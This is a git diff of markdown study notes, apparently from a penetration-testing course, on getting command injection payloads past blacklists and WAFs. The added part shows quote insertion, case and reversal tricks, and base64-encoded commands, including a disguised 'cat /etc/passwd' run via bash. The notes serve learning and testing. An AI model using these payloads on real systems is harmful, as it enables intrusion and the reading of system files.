@@ -37,7 +37,7 @@ Most common operators to be used for various injection types:
 - Test each injection operator - whichever one does not get blocked is NOT blacklisted
 	- Use Burp Intruder > Sniper + Payload Processing (URL)
 	- Only operators, no OS commands for now
-### Bypassing Space Filters
+### Bypassing **Space** Filters
 - Some WAF may filter for spaces / `+`
 	- Bypass with **Tabs**, **$IFS**, or **Brace Expansion**
 #### Using Tabs
@@ -65,7 +65,7 @@ e.g:
 >[!NOTE:]
 >Other ways to [Bypass Space Filters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
 
-### Bypassing Other Blacklisted Characters
+### Bypassing Other Blacklisted **Characters**
 
 Other commonly blacklisted characters include:
 - `/`
@@ -107,5 +107,85 @@ echo $(tr '!-}' '"-~'<<<:)
 
 >[!Note:]
 >We can use PowerShell commands to perform Character Shifting as well
+
+---
+
+### Bypassing Blacklisted **Commands**
+
+#### Linux & Windows
+
+```bash
+w'h'o'am'i
+w"h"o"am"i
+```
+
+#### Linux Only
+
+```bash
+who$@ami
+w\ho\am\i
+```
+
+#### Windows Only
+
+```cmd
+who^ami
+```
+
+---
+
+### Advanced Command Obfuscation
+For when WAFs are implemented.
+#### Case Manipulation
+
+In **Windows**, CMD and PowerShell are case-insensitive:
+```CMD & PowerShell
+WhOaMi
+```
+
+In **Linux**, since it is case-sensitive, we must replace the uppercase with lowercase:
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+#### Reversed Commands
+##### Linux
+
+```bash
+echo 'whoami' | rev
+$(rev<<<'imaohw')
+```
+
+##### Windows
+
+```PowerShell
+"whoami"[-1..-20] -join ''
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+#### Encoded Commands
+
+##### Linux
+
+```bash
+echo -n 'cat /etc/passwd' | base64 # 1st way to encode
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64 # 2nd way to encode
+
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk) # Note that we are using <<< to avoid using a pipe |, assuming it is a filtered character.
+```
+
+>[!Note:]
+>Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques in the above sections (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.
+
+##### Windows
+
+```PowerShell
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+>[!Note:]
+>Other methods can be utilized such as: wildcards, regex, output redirection, integer expansion, and others. See more techniques [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
 
 ---
